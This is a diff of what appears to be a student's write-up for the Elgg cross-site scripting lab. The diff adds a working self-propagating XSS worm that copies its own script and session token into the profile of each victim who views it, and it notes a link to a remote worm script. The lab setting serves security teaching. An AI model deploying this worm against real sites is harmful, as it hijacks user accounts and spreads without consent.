@@ -267,7 +267,7 @@ __elgg_token=e14473d4037a91b83100066cf70b8dce
 Now we can forge an AJAX-request using javascript
 
 ```html
-<script id="worm">
+<script>
 'use strict';
 
 const CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
@@ -280,17 +280,9 @@ let Ajax = new XMLHttpRequest();
 Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
 Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
 Ajax.setRequestHeader("Keep-Alive", "300");
-Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0");
-Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
-Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
-Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+escape(elgg.session.user.username)+"/edit");
 Ajax.setRequestHeader("Cookie", "Elgg="+escape(document.cookie));
 Ajax.setRequestHeader("Connection", "keep-alive");
-Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
 Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-Ajax.setRequestHeader("Content-Length", CONTENT.length);
 Ajax.send(CONTENT);
 </script>
 ```
@@ -315,5 +307,31 @@ The propagating mechanism can use one of the following two approaches:
 <script type="text/javascript" src="http://example.com/xss_worm.js"></script>
 ```
 
+**worm.html** + comments
 
 
+```html
+<script id="worm">  // Give the worm an ID so it can refer to itself
+window.onload = function () {
+var CODE = document.getElementById("worm").innerHTML; // copy content of self
+var CONTENT = "".concat("__elgg_token=", elgg.security.token.__elgg_token, // string.concat()
+"&__elgg_ts=", elgg.security.token.__elgg_ts,
+"&name=", elgg.session.user.name, 
+"&description=", "<script id='worm'>".concat(CODE, "<\/script>"), // Give ID to copy of worm
+"&guid=", elgg.session.user.guid);
+var Ajax = new XMLHttpRequest();
+Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
+Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+Ajax.setRequestHeader("Keep-alive", "300");
+Ajax.setRequestHeader("Cookie", document.cookie);
+Ajax.setRequestHeader("Connection", "keep-alive");
+Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); // url-encode
+Ajax.send(escape(CONTENT)); // url-encode content
+</script>
+```
+
+1.  We have to give the worm an id, so it can refer and copy it's own contents
+2. We have to concatinate using a function instead of +, since + is a special character in *url-encoding*.
+3. Use the escape() function to *url-encode* all content.
+
+..... to be continued.
